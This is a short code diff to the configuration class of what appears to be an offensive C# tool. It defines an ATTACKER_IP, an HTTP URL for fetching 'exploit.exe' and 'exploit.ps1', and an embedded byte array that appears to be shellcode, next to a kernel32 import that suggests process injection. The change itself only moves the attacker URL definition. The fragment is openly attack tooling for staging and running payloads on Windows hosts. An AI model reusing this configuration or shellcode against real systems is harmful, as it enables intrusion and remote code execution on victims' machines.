@@ -7,6 +7,7 @@ public static class CONFIG
     //Environment Variables
     public static string ATTACKER_IP = "192.168.10.10";
     public static string HTTP_PORT = "80";
+    public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
     public static string BINARY_NAME = "exploit.exe";
     public static string POWERSHELL_SCRIPT_NAME = "exploit.ps1";
     public static string WAIT_TIME_SECONDS = "2";
@@ -74,7 +75,7 @@ public static class CONFIG
         0x6a,0x00,0x59,0xbb,0x1d,0xf5,0x52,0xe0,0x41,0x89,0xda,0xff,
         0xd5};
 
-    public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
+    
 
 
     [DllImport("kernel32.dll")]
